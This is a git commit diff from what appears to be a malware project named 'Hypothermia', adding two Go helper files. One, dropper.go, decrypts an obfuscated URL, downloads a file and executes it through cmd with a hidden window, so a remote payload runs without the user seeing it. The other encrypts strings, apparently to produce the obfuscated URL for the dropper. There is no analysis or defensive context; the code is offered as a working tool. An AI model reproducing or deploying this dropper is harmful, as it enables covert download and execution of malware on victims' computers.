68c98f45364592873fec6524c0904c638e3b1e3c
chocolate <readonlychocolate@gmail.com>
2025-04-15 05:49:09 +0800

    helper files

--- _helpers/dropper.go
+++ _helpers/dropper.go
@@ -1,1 +1,35 @@
+package main
 
+import (
+	"fmt"
+	"os/exec"
+	"syscall"
+
+	"Hypothermia/src/utils"
+	"Hypothermia/src/utils/crypto"
+)
+
+const DOWNLOAD_URL string = ""
+
+func main() {
+	path, err := utils.DonwloadFile(utils_crypto.DecryptBasic(DOWNLOAD_URL))
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+
+	cmd := exec.Command("cmd", "/c", path)
+	cmd.SysProcAttr = &syscall.SysProcAttr{
+		HideWindow: true,
+	}
+
+	cmd.Stderr = nil
+	cmd.Stdout = nil
+	cmd.Stdin = nil
+
+	err = cmd.Run()
+	if err != nil {
+		fmt.Println("🟥 Failed to run")
+		return
+	}
+}
---
+++ _helpers/encryptor.go
@@ -0,0 +1,28 @@
+package main
+
+import (
+	"fmt"
+
+	"Hypothermia/src/utils/crypto"
+)
+
+func main() {
+	var token string
+
+	fmt.Print("Data: ")
+	_, err := fmt.Scanf("%s", &token)
+	if err != nil {
+		fmt.Println("Error reading:", err)
+		return
+	}
+
+	fmt.Printf("Encrypting data: \"%s\"\n", token)
+
+	encrypted := utils_crypto.EncryptBasic(token)
+	fmt.Println("Encrypted data:", encrypted)
+
+	decrypted := utils_crypto.DecryptBasic(encrypted)
+	fmt.Println("Decrypted data:", decrypted)
+
+	fmt.Printf("Does it match: %v\n", token == decrypted)
+}
